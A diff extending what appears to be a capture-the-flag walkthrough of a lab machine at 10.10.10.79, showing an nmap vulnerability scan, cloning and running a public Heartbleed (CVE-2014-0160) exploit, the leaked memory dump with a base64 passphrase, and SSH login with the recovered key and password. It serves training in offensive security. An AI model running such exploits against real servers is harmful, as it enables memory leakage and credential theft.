@@ -43,6 +43,76 @@ gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.79 -k -n -r 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/002868a3-a360-473a-bdfc-b128ed33353f)
 
++ Login ssh: `ssh -i id_rsa hype@10.10.10.79`
++ `chmod 600 id_rsa`
++ It requires password.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1e082bc-05d6-4068-acd0-45d969777a71)
+
++ Do more enumeration: `sudo nmap -Pn -n --script vuln -p$ports 10.10.10.79`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff889a3f-83fa-49a3-9646-8c17dcc949db)
+
++ Port 443 is running a version of OpenSSL that is vulnerable to **Heartbleed**!
++ `git clone https://gist.github.com/eelsivart/10174134`
++ `python heartbleed.py 10.10.10.79`
+```
+┌──(kali㉿kali)-[~/Desktop/10174134]
+└─$ python2 heartbleed.py 10.10.10.79     
+
+defribulator v1.16
+A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
+
+##################################################################
+Connecting to: 10.10.10.79:443, 1 times
+Sending Client Hello for TLSv1.0
+Received Server Hello for TLSv1.0
+
+WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
+Please wait... connection attempt 1 of 1
+##################################################################
+
+.@....SC[...r....+..H...9...
+....w.3....f...
+...!.9.8.........5...............
+.........3.2.....E.D...../...A.................................I.........
+...........
+...................................#.......0.0.1/decode.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.7.U.[..S..6?....................nnection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+GET /printer/ HTTP/1.1
+Host: 10.10.10.79
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54f4c737-c556-4002-a270-a5a4e453b02a)
+
++ Navigate to **http://10.10.10.79/decode.php**. Copy the string, and decode it.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8043e8ba-37eb-4804-adc4-599ff419d146)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7fe3609b-9537-4bb9-be08-aa29b64eefff)
+
++ Use the decoded value `heartbleedbelievethehype` on ssh login.
++ Login ssh again: `ssh -i id_rsa hype@10.10.10.79`
++ If you face a problem **sign_and_send_pubkey: no mutual signature supported**, check [the link](https://hazercloud.com/blog/sign_and_send_pubkey-no-mutual-signature-supported/).
++ We login successfully.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0a4080-0c44-44b8-8073-e4f321d78fc9)
+
+
+
+
+
+
+
+
 
 
 
